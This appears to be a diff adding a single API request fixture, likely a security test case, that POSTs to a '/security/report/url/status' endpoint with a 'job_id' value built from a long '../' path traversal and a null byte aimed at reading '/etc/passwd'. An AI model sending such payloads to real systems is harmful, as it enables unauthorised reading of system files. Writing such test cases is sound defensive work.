@@ -1,0 +1,4 @@
+path:/security/report/url/status
+method: post
+------
+{"job_id":"../../../../../../../../../../../../../../etc/passwd\u0000"}
